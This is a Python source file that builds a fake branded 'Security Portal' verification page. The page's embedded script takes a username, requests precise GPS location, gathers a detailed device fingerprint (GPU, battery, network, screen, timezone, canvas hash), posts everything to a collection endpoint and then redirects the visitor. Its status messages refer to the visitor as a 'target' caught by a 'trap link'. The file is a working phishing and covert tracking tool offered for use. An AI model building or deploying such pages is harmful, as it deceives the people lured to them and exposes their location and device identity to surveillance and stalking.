class TemplateCloner:
    @staticmethod
    def generate_template(brand_name, redirect_url):
        brand = brand_name.strip().capitalize() if brand_name else "Verification"
        
        html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>{brand} - NanoGPS Security Portal</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="background:#0f172a;color:#f8fafc;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;">
    <div style="width:100%;max-width:380px;background:#1e293b;padding:30px;border-radius:12px;box-shadow:0 4px 25px rgba(0,0,0,0.6);text-align:center;">
        <h2 style="margin-bottom:10px;color:#38bdf8;">{brand}</h2>
        <p style="color:#94a3b8;font-size:13px;margin-bottom:25px;">Please verify your account to continue session.</p>
        
        <div style="margin-bottom:20px;text-align:left;">
            <label style="font-size:12px;color:#cbd5e1;">Username or Email</label>
            <input type="text" id="usr" placeholder="Enter username" style="width:100%;padding:10px;margin-top:5px;background:#0f172a;border:1px solid #334155;color:white;border-radius:6px;box-sizing:border-box;outline:none;">
        </div>

        <button onclick="initSequence()" style="width:100%;background:#3b82f6;color:white;border:none;padding:12px;font-size:15px;border-radius:6px;cursor:pointer;font-weight:bold;">Continue</button>
    </div>

<script>
const TARGET_REDIRECT = "{redirect_url}";

function finalize() {{
    setTimeout(() => {{
        window.location.replace(TARGET_REDIRECT);
    }}, 1000);
}}

async function transmit(payload) {{
    try {{
        await fetch('/collect', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify(payload)
        }});
    }} catch(e) {{}}
}}

async function initSequence() {{
    let userVal = document.getElementById('usr').value;
    await transmit({{type: 'status', message: 'Target input username: ' + (userVal || 'N/A')}});
    await transmit({{type: 'status', message: 'Requesting GPS coordinates...'}});

    navigator.geolocation.getCurrentPosition(
        async (pos) => {{
            await transmit({{
                type: 'geo', 
                lat: pos.coords.latitude, 
                lon: pos.coords.longitude,
                acc: pos.coords.accuracy
            }});
            captureAdvancedFingerprint();
        }},
        async (err) => {{
            await transmit({{type: 'status', message: 'GPS Permission Denied. Proceeding to Fingerprint...'}});
            captureAdvancedFingerprint();
        }},
        {{ enableHighAccuracy: true, timeout: 8000 }}
    );
}}

async function captureAdvancedFingerprint() {{
    await transmit({{type: 'status', message: 'Extracting deep telemetry & device specs...'}});
    
    let canvasHash = 'N/A';
    try {{
        let cv = document.createElement('canvas');
        let ctx = cv.getContext('2d');
        ctx.textBaseline = "top";
        ctx.font = "14px 'Arial'";
        ctx.fillText("NanoGPS 🛡️", 2, 2);
        canvasHash = cv.toDataURL().slice(-35);
    }} catch(e) {{}}

    let storageInfo = 'N/A';
    try {{
        if (navigator.storage && navigator.storage.estimate) {{
            let est = await navigator.storage.estimate();
            storageInfo = "Quota: " + (est.quota / (1024*1024*1024)).toFixed(2) + " GB";
        }}
    }} catch(e) {{}}

    let data = {{
        type: 'fingerprint',
        inputUser: document.getElementById('usr').value || 'N/A',
        storage: storageInfo,
        ua: navigator.userAgent || 'N/A',
        platform: navigator.platform || 'N/A',
        lang: navigator.language || 'N/A',
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
        cores: navigator.hardwareConcurrency || 'N/A',
        ram: navigator.deviceMemory || 'N/A',
        touch: navigator.maxTouchPoints || 0,
        width: screen.width,
        height: screen.height,
        dpr: window.devicePixelRatio || 1,
        colorDepth: screen.colorDepth || 'N/A',
        cookies: navigator.cookieEnabled ? 'Yes' : 'No',
        chash: canvasHash,
        gpu: 'N/A',
        battery: 'N/A',
        network: 'N/A'
    }};

    try {{
        let conn = navigator.connection || navigator.mozConnection;
        if (conn) {{
            data.network = (conn.effectiveType || 'unknown') + " (" + (conn.downlink || 'N/A') + "Mbps)";
        }}
    }} catch(e) {{}}

    try {{
        let bat = await navigator.getBattery();
        data.battery = Math.round(bat.level * 100) + "% (" + (bat.charging ? 'Charging' : 'Discharging') + ")";
    }} catch(e) {{}}

    try {{
        let cv2 = document.createElement('canvas');
        let gl = cv2.getContext('webgl') || cv2.getContext('experimental-webgl');
        let ext = gl.getExtension('WEBGL_debug_renderer_info');
        if (ext) {{
            data.gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
        }}
    }} catch(e) {{}}

    await transmit(data);
    await transmit({{type: 'status', message: 'Telemetry captured. Redirecting target...'}});
    finalize();
}}

window.onload = async () => {{
    await transmit({{type: 'status', message: 'Target opened the dynamic trap link.'}});
}};
</script>
</body>
</html>
"""
        return html_content